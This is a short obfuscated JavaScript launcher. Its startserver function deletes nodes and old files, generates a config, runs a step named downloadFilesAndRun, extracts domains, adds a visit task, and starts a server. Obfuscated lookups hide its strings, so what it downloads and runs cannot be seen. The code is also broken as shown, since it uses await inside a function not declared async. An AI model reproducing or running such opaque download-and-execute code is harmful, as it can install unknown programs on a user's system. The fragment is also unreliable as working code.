function startserver(){const _0x4cb598=_0x4fbd72;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4e611){console[_0x4cb598(0x1cc)](_0x4cb598(0x1c3),_0x4e611);}}startserver()[_0x4fbd72(0x163)](_0x4dc614=>{const _0x4b685f=_0x4fbd72;console['error'](_0x4b685f(0x17a),_0x4dc614);}),app['listen'](PORT,()=>console[_0x4fbd72(0x20e)](_0x4fbd72(0x1b2)+PORT+'!'));
